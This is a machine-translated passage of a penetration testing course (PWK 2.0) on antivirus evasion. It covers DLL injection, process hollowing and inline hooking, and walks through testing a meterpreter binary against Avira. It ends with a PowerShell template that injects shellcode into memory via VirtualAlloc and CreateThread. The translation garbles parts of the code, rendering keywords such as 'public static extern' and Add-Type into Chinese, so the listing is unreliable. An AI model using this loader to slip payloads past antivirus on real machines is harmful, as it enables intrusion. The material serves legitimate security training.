<div style="position:absolute;top:62877;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">415 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(F-Secure, 2018) https://blog.f-secure.com/memory-injection-like-a-boss/</font></font></font></nobr></div>
<div style="position:absolute;top:62897;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">416 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Windows_API</font></font></font></nobr></div>
<div style="position:absolute;top:62917;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">417 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2019 年），https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-openprocess</font></font></font></nobr></div>
<div style="position:absolute;top:62937;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">418 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（维基百科，2019 年），https:</font></font><font style="vertical-align: inherit;"> //en.wikipedia.org/wiki/Handle_ </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（计算）</font></font></font></nobr></div>
<div style="position:absolute;top:62957;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">419 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex</font></font></font></nobr></div>
<div style="position:absolute;top:62977;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">420 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory</font></font></font></nobr></div>
<div style="position:absolute;top:62997;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">421 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:63012;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">创建远程线程 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:63139;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="54"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 54 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:63172;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:64249;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:64249;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:64249;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">495</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:63268;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">17.3.2.2 反射 DLL 注入</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:63302;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与常规 DLL 注入不同，后者意味着使用</font></font></nobr></div>
<div style="position:absolute;top:63322;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LoadLibrary </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">422</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> API，该技术试图加载攻击者在进程中存储的DLL</font></font></nobr></div>
<div style="position:absolute;top:63341;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">记忆。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">423</font></font></font></nobr></div>
<div style="position:absolute;top:63374;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实现这种技术的主要挑战是</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LoadLibrary</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不支持加载</font></font></nobr></div>
<div style="position:absolute;top:63393;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来自内存的 DLL。</font><font style="vertical-align: inherit;">此外，Windows 操作系统不会公开任何 API</font></font></nobr></div>
<div style="position:absolute;top:63413;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">也可以处理这个。</font><font style="vertical-align: inherit;">选择使用这种技术的攻击者必须编写自己的版本</font></font></nobr></div>
<div style="position:absolute;top:63432;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不依赖于基于磁盘的 DLL 的 API。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:63466;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">17.3.2.3 工艺镂空</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:63501;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击者</font><font style="vertical-align: inherit;">使用进程挖空</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">424</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">绕过杀毒软件时，首先发起非</font></font></nobr></div>
<div style="position:absolute;top:63520;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">处于挂起状态的恶意进程。</font><font style="vertical-align: inherit;">一旦启动，进程的映像就会从</font></font></nobr></div>
<div style="position:absolute;top:63540;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内存并替换为恶意的可执行映像。</font><font style="vertical-align: inherit;">最后，然后恢复该过程并</font></font></nobr></div>
<div style="position:absolute;top:63559;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行恶意代码而不是合法进程。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:63593;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">17.3.2.4 内联挂钩</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:63628;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">顾名思义，这种技术涉及修改内存和引入一个钩子</font></font></nobr></div>
<div style="position:absolute;top:63647;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（重定向代码执行的指令）到一个函数中，将执行流指向我们的</font></font></nobr></div>
<div style="position:absolute;top:63666;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">恶意代码。</font><font style="vertical-align: inherit;">执行我们的恶意代码后，流程将返回到修改后的</font></font></nobr></div>
<div style="position:absolute;top:63686;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">函数并恢复执行，看起来好像只执行了原始代码。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:63720;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">17.3.3</font></font></i></nobr></div>
<div style="position:absolute;top:63720;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AV 规避：实际示例</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:63758;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们对杀毒软件中使用的检测技术有了一个大致的了解</font></font></nobr></div>
<div style="position:absolute;top:63778;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以及相关的绕过方法，我们可以将注意力转向一个实际的例子。</font></font></nobr></div>
<div style="position:absolute;top:63810;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果没有，找到绕过所有防病毒产品的通用解决方案既困难又耗时</font></font></nobr></div>
<div style="position:absolute;top:63830;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不可能的。</font><font style="vertical-align: inherit;">考虑到典型渗透测试中的时间限制，更有效地</font></font></nobr></div>
<div style="position:absolute;top:63849;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">针对部署在客户端网络中的特定防病毒产品。</font></font></nobr></div>
<div style="position:absolute;top:63882;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">出于本模块的目的，我们将在我们的计算机上安装 Avira Free Antivirus 版本 15.0.34.16</font></font></nobr></div>
<div style="position:absolute;top:63901;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 10 客户端。</font><font style="vertical-align: inherit;">Avira 安装程序位于 C:\Tools\antivirus_evasion\ 目录中。</font></font></nobr></div>
<div style="position:absolute;top:63920;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安装后，我们可以通过搜索“启动 Avira Antivirus”来检查其配置</font></font></nobr></div>
<div style="position:absolute;top:63940;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 10 搜索栏：</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:64145;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">422 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya</font></font></font></nobr></div>
<div style="position:absolute;top:64165;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">423 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Andrea Fortuna, 2017), https://www.andreafortuna.org/2017/12/08/what-is-reflective-dll-injection-and-how-can-be-detected/</font></font></font></nobr></div>
<div style="position:absolute;top:64185;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">424 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Mantvydas Baranauskas，2019 年），https://ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:64200;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图像重定位 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:64327;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="55"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 55 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:64360;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:65437;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:65437;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:65437;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">496</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:64975;left:277"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 264：在搜索栏中搜索启动 Avira Antivirus。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:65006;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启动此应用程序将显示 Avira 控制中心，我们可以在其中验证</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实时</font></font></i></nobr></div>
<div style="position:absolute;top:65025;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">保护</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">功能已启用，如果没有，我们可以手动启用它：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:65319;left:366"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 265：Avira 控制中心。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:65350;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为第一步，我们应该验证防病毒产品是否按预期工作。</font><font style="vertical-align: inherit;">我们将使用</font></font></nobr></div>
<div style="position:absolute;top:65369;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们之前生成的 meterpreter 有效负载并使用 Avira 对其进行扫描。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:65515;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="56"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 56 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:65548;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:66625;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:66625;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:66625;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">497</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:65644;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将恶意 PE 传输到我们的 Windows 客户端后，我们将尝试运行二进制文件并</font></font></nobr></div>
<div style="position:absolute;top:65663;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">观察结果。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:65698;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\offsec\Desktop&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目录</font></font></font></b></nobr></div>
<div style="position:absolute;top:65715;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">驱动器 C 中的卷没有标签。</font></font></nobr></div>
<div style="position:absolute;top:65732;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">卷序列号为 56B9-BB74</font></font></nobr></div>
<div style="position:absolute;top:65766;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\offsec\Desktop 目录</font></font></nobr></div>
<div style="position:absolute;top:65800;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">02/26/2018 上午 10:20 &lt;DIR&gt;    </font></font></nobr></div>
<div style="position:absolute;top:65800;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.</font></font></nobr></div>
<div style="position:absolute;top:65817;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">02/26/2018 上午 10:20 &lt;DIR&gt;    </font></font></nobr></div>
<div style="position:absolute;top:65817;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">..</font></font></nobr></div>
<div style="position:absolute;top:65834;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">02/26/2018 06:16 AM    </font></font></nobr></div>
<div style="position:absolute;top:65834;left:368"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">73,802 </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">binary.exe</font></font></font></b></nobr></div>
<div style="position:absolute;top:65851;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2018/02/26 05:55    </font></font></nobr></div>
<div style="position:absolute;top:65851;left:392"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">799 Windows 10 更新助手.lnk</font></font></nobr></div>
<div style="position:absolute;top:65868;left:230"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3 个文件    </font></font></nobr></div>
<div style="position:absolute;top:65868;left:376"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">75,647 字节</font></font></nobr></div>
<div style="position:absolute;top:65885;left:230"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3 目录 4,521,566,208 字节空闲</font></font></nobr></div>
<div style="position:absolute;top:65919;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\offsec\Desktop&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">binary.exe</font></font></font></b></nobr></div>
<div style="position:absolute;top:65935;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统无法执行指定的程序。</font></font></nobr></div>
<div style="position:absolute;top:65955;left:276"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 497 - Avira 阻止恶意 PE 的执行。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:65984;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这种情况下，我们会看到一条错误消息，表明系统无法执行我们的</font></font></nobr></div>
<div style="position:absolute;top:66003;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件。</font><font style="vertical-align: inherit;">紧接着，Avira 显示一个弹出通知，通知我们该文件已</font></font></nobr></div>
<div style="position:absolute;top:66023;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">被标记为恶意并被隔离。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:66383;left:349"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 266：Avira 免费防病毒弹出窗口。</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:66414;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">17.3.3.1 PowerShell 内存注入</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:66448;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据我们的目标环境及其受限程度，我们或许能够绕过防病毒软件</font></font></nobr></div>
<div style="position:absolute;top:66467;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 PowerShell 的帮助下开发产品。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">425</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:66561;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">425 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2017 年），https://docs.microsoft.com/en-us/powershell/scripting/getting-started/getting-started-with-windows-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:66576;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powershell?view=powershell-6 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:66703;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="57"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 57 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:66736;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:67813;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:67813;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:67813;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">498</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:66832;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在下面的例子中，我们将使用一种类似于 Remote</font></font></nobr></div>
<div style="position:absolute;top:66851;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进程内存注入部分。</font><font style="vertical-align: inherit;">主要区别在于我们将针​​对</font></font></nobr></div>
<div style="position:absolute;top:66870;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当前正在执行的进程，在我们的例子中将是 PowerShell 解释器。</font></font></nobr></div>
<div style="position:absolute;top:66903;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShell 的一个非常强大的功能是它能够与 Windows API 交互。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">426</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这使得</font></font></nobr></div>
<div style="position:absolute;top:66923;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们在 PowerShell 脚本中实现内存注入过程。</font><font style="vertical-align: inherit;">主要好处之一</font></font></nobr></div>
<div style="position:absolute;top:66942;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行脚本而不是 PE 的事实是防病毒制造商很难</font></font></nobr></div>
<div style="position:absolute;top:66961;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">确定脚本是否恶意，因为它在解释器中运行，而脚本本身不是</font></font></nobr></div>
<div style="position:absolute;top:66980;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可执行代码。</font><font style="vertical-align: inherit;">不过，请记住，某些 AV 产品比其他产品更好</font></font></nobr></div>
<div style="position:absolute;top:67000;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并更成功地处理恶意脚本检测。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">427</font></font></font></nobr></div>
<div style="position:absolute;top:67033;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此外，即使脚本被标记为恶意，也很容易被更改。</font><font style="vertical-align: inherit;">防毒软件</font></font></nobr></div>
<div style="position:absolute;top:67052;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会经常查看变量名、注释和逻辑，所有这些都可以在没有</font></font></nobr></div>
<div style="position:absolute;top:67072;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">需要重新编译任何东西。</font></font></nobr></div>
<div style="position:absolute;top:67104;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在下面的清单中，我们看到了一个执行内存注入的基本模板脚本：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:67139;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$代码 = '</font></font></nobr></div>
<div style="position:absolute;top:67156;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[DllImport("kernel32.dll")]</font></font></nobr></div>
<div style="position:absolute;top:67173;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">公共静态外部 IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocat</font></font></nobr></div>
<div style="position:absolute;top:67190;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ionType, uint flProtect);</font></font></nobr></div>
<div style="position:absolute;top:67224;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[DllImport("kernel32.dll")]</font></font></nobr></div>
<div style="position:absolute;top:67241;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">公共静态外部 IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,</font></font></nobr></div>
<div style="position:absolute;top:67258;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);</font></font></nobr></div>
<div style="position:absolute;top:67292;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[DllImport("msvcrt.dll")]</font></font></nobr></div>
<div style="position:absolute;top:67309;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">public static extern IntPtr memset(IntPtr dest, uint src, uint count);';</font></font></nobr></div>
<div style="position:absolute;top:67343;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$winFunc = </font></font></nobr></div>
<div style="position:absolute;top:67360;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">添加类型 -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;</font></font></nobr></div>
<div style="position:absolute;top:67394;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[字节[]];</font></font></nobr></div>
<div style="position:absolute;top:67411;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[Byte[]]$sc = &lt;把你的shellcode放在这里&gt;;</font></font></nobr></div>
<div style="position:absolute;top:67445;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$size = 0x1000;</font></font></nobr></div>
<div style="position:absolute;top:67478;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">if ($sc.Length -gt 0x1000) {$size = $sc.Length};</font></font></nobr></div>
<div style="position:absolute;top:67513;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);</font></font></nobr></div>
<div style="position:absolute;top:67546;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc</font></font></nobr></div>
<div style="position:absolute;top:67563;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[$i], 1)};</font></font></nobr></div>
<div style="position:absolute;top:67597;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };</font></font></nobr></div>
<div style="position:absolute;top:67617;left:279"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 498 - PowerShell 的内存负载注入脚本</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:67729;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">426 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（马特格雷伯，2013 年），https://blogs.technet.microsoft.com/heyscriptingguy/2013/06/25/use-powershell-to-interact-with-the-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:67744;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">windows-api-part-1/</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:67763;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">427 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2019 年），https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:67891;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="58"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 58 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
